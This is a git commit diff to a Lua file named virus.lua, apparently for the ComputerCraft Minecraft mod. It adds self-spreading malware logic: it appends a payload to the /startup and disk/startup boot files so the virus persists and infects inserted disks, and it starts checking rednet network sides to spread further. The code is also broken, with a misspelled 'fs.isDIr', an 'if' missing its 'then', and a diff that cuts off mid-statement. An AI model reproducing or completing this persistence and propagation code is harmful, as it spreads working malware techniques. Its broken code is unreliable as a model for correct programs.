938378d9d494196c2185ef563173a0f078a33556
ZeeDerp <zeederpmaster@gmail.com>
2021-01-14 00:21:56 -0600

    Mass Fix

--- virus.lua
+++ virus.lua
@@ -3,8 +3,19 @@
 -- infect disks
 -- maybe use _G.fs to offload files?
 payload = ""
+sides = {"left","right","back","top","bottom"}
 if fs.exists("/startup") then
     vic = fs.open("/startup","a")
 else
     vic = fs.open("/startup","w")
 end
+if fs.isDIr("disk") then
+    if fs.exists("disk/startup") then
+        vicDisk = fs.open("disk/startup","a")
+    else
+        vicDisk = fs.open("disk/startup","w")
+    end
+end
+for i=1,#sides do
+    if rednet.isOpen(sides[i])
+        rednet.
